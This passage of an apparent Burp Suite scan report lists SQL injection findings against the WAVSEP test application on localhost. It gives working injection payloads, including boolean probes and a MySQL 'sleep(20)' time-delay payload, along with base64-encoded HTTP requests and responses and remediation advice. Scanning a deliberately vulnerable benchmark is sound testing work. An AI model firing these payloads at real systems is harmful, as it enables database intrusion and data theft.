    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>31894733 or 2793=02793</b> and <b>84521901 or 1464=1471</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20009</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD9taW5CYWxhbmFjZT0xMDAwMDMxODk0NzMzJTIwb3IlMjAyNzkzJTNkMDI3OTMgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD9taW5CYWxhbmFjZT0xMDAwMDg0NTIxOTAxJTIwb3IlMjAxNDY0JTNkMTQ3MSBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tR0VULTUwMEVycm9yL2luZGV4LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPTRFRTlBQ0Q5NkI0NTZFQ0NFOUY1MkJCQTc4MUUyRjFEDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ2OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRXJyb3JzLmpzcD9taW5CYWxhbmFjZT0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSkgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLUdFVC01MDBFcnJvci9pbmRleC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzODYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6997898181126062080</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-500Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvQ2FzZTE5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWNXaXRob3V0UXVvdGVzLUNvbW1hbmRJbmplY3Rpb24tV2l0aEVycm9ycy5qc3A/bXNnaWQ9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1HRVQtNTAwRXJyb3IvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ1OjQ5IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE5IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8144816552465829888</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-Blind/Case02-ConditionalError-RetrieveAdminPassword-BlindExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-GET/SInjection-Detection-Evaluation-New-Cases-GET-Blind/Case02-ConditionalError-RetrieveAdminPassword-BlindExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a general error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20001</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtR0VUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC1CbGluZC9DYXNlMDItQ29uZGl0aW9uYWxFcnJvci1SZXRyaWV2ZUFkbWluUGFzc3dvcmQtQmxpbmRFeHBsb2l0LmpzcD9tc2c9dGV4dHZhbHVlJyBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLUdFVC9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1HRVQtQmxpbmQvaW5kZXguanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDcxMg0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo1MDo1OSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5c